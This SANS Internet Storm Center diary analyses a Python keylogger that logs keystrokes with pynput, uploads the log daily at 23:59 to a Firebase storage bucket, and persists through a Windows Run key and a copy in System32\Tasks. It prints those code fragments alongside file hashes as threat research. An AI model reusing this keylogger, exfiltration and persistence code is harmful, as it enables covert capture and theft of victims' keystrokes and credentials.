---
title: 23:59, Time to Exfiltrate&#x21;, (Tue, Sep 17th)
url: https://isc.sans.edu/diary/rss/31272
source: SANS Internet Storm Center, InfoCON: green
date: 2024-09-18
fetch_date: 2025-10-06T18:27:53.999845
---

# 23:59, Time to Exfiltrate&#x21;, (Tue, Sep 17th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31268)
* [next](/diary/31276)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [23:59, Time to Exfiltrate!](/forums/diary/2359%2BTime%2Bto%2BExfiltrate/31272/)

**Published**: 2024-09-17. **Last Updated**: 2024-09-17 07:03:12 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/2359%2BTime%2Bto%2BExfiltrate/31272/#comments)

Last week, I posted a diary about suspicious Python modules. One of them was Firebase [[1](https://pypi.org/project/firebase/)], the cloud service provided by Google[[2](https://firebase.google.com/solutions)]. Firebase services abused by attackers is not new, usually, it’s used to host malicious files that will be available to download[[3](https://isc.sans.edu/diary/Recent%2BIcedID%2BBokbot%2Bactivity/29740)]. This is a nice location because who will think that a Google link is malicious?

Today, while reviewing my hunting results, I found an interesting Python script (again!) that relies on Firebase but this time to exfiltrate data. Unfortunately, the file was stand-alone and I missed the JSON file containing the credentials to connect to the Firebase account. The file "iLoveYou.py" has a low score on VT (2/65) (SHA256:ec88244d7b037306bdb53d60f2a709af13ca74d15937d9901c8cd90bc00720f6)[[4](https://www.virustotal.com/gui/file/ec88244d7b037306bdb53d60f2a709af13ca74d15937d9901c8cd90bc00720f6)]

The file is a classic keylogger. Very easy to implement in Python using pyinput[[5](https://pypi.org/project/pynput/)]:

```

from pynput.keyboard import Key, Listener
...
with Listener(on_press=tus_basildi) as listener:
    listener.join()
```

Every key press will generate a call to the function tus\_basildi(). Note: the variable names are based on Turkish words

This keylogger has been implemented in a “funny” way: Key presses are logged and stored in a temporary file. But the file will be exfiltrated daily at 23:59:

```

current_time = time.strftime("%H:%M")
if current_time == "23.59":
    if sayac == 0:
        blob = bucket.blob(bulut_path)
        blob.upload_from_filename(yerel_dosya)
        sayac = 1
```

Another funny fact: The script is buggy! Once the file has been exfiltrated at 23:59, the variable ‘savac’ will be set to 1 but never reset. If the script runs for over 24 hours, it will never exfiltrate the file again. Maybe the attacker expects the victim to log in every day?

Persistence is implemented classically via a Run key:

```

def reg_olustur(nereye_koyucam, adi_ne_bunun, ne_yapicak_bu_sey):
    elektar = winreg.OpenKey(winreg.HKEY_CURRENT_USER, nereye_koyucam, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(elektar, adi_ne_bunun, 0, winreg.REG_SZ, ne_yapicak_bu_sey)
    winreg.CloseKey(elektar)

nereye_koycam = "Software\Microsoft\Windows\CurrentVersion\Run"
adi_ne_bunun = bilgisayar_adi
ne_yapicak_bu_sey = f"C:\Windows\System32\Tasks\iloveyou.exe"
reg_olustur(nereye_koycam, adi_ne_bunun, ne_yapicak_bu_sey)
```

The fact that an executable will be launched at login time, this Python script will probably be compiled. It should copy itself in the Tasks directory:

```

kaynak_dosya = 'iloveyou.exe'
hedef_dizin = 'C:\Windows\System32\Tasks'
shutil.copy(kaynak_dosya, hedef_dizin)
```

I tried to find the executable, without luck! But I found a previous version of the script, created a few days before (SHA256:43a4d56c11a12de13b8d2186daf5b00d793076fb47afcee5ecd0b327a634e150)

[1] <https://pypi.org/project/firebase/>
[2] <https://firebase.google.com/solutions>
[3] [https://isc.sans.edu/diary/Recent+IcedID+Bokbot+activity/29740](https://isc.sans.edu/diary/Recent%2BIcedID%2BBokbot%2Bactivity/29740)
[4] <https://www.virustotal.com/gui/file/ec88244d7b037306bdb53d60f2a709af13ca74d15937d9901c8cd90bc00720f6>
[5] <https://pypi.org/project/pynput/>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [Firebase](/tag.html?tag=Firebase) [Keylogger](/tag.html?tag=Keylogger) [Malware](/tag.html?tag=Malware) [Python](/tag.html?tag=Python)

[0 comment(s)](/diary/2359%2BTime%2Bto%2BExfiltrate/31272/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31268)
* [next](/diary/31276)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)